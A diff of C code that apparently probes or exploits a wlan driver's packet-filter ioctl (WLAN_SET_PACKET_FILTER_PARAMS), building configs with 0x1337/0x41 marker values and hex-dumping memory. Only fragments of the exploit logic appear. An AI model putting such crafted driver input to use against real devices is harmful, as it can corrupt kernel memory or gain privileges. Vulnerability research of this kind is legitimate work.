@@ -193,9 +193,9 @@ int prepare(){
 	cfg.paramsData[0].dataOffset = 0;
 	cfg.paramsData[0].dataLength = 0;
 	//cfg.paramsData[0].compareData = 0x1337000041414100UL;
-	//cfg.paramsData[0].dataMask = 0x13370008133704UL;
+	//cfg.paramsData[0].dataMask = 0x1337000813370004UL;
 	assign_chrs(cfg.paramsData[0].compareData, tmp, 0x1337000041414100UL);
-	assign_chrs(cfg.paramsData[0].dataMask, tmp, 0x13370008133704UL);
+	assign_chrs(cfg.paramsData[0].dataMask, tmp, 0x1337000813370004UL);
 	
 	
 	cfg.paramsData[1].protocolLayer = 0x0C;
@@ -323,9 +323,13 @@ void prepare2(){
 
 void print_chars(char* chs, int size){
 	int i;
-	printf("%p:", chs);
+	printf("%p : ", chs);
 	for(i=0; i<size; i++){
-		printf("%x ", *(chs+i));
+		if( *(chs+i) < 16 ){
+			printf("0%x ", *(chs+i));
+		}else{
+			printf("%x ", *(chs+i));
+		}
 	}
 	printf("\n");
 }
@@ -357,8 +361,6 @@ void prepare3(){
 	pCfg->filterId = 0x0;
 	pCfg->numParams = 0x4;
 	
-	print_chars( (char*)pCfg+3, 20);
-	
 	n0 = 0;
 	do{
 		pCfg->paramsData[n0++].dataLength = 0;
@@ -379,16 +381,19 @@ void prepare3(){
 		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
 	}
 	printf("[++] ioctl wlan0 ret=%d\n", ret);
+	/*
 	if( -1 == ( ret = ioctl(3, WLAN_SET_PACKET_FILTER_PARAMS, &ifr, 0x889) ) ){
 		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
 	}
 	printf("[++] ioctl wlan0 ret=%d\n", ret);
-	
+	*/
 	//验证
+	printf("+++++++++++++++++++++++\n");
 	print_chars( (char*)&ifr, 16 );
 	print_chars( (char*)&ifr.ifr_ifru.ifru_data, sizeof(ifr)-16);
 	
 	print_chars( (char*)pCfg, 3);
+	print_chars( (char*)pCfg+3, 20);
 	print_chars( (char*)pCfg+23, 20);
 	print_chars( (char*)pCfg+43, 20);
 	print_chars( (char*)pCfg+63, 20);
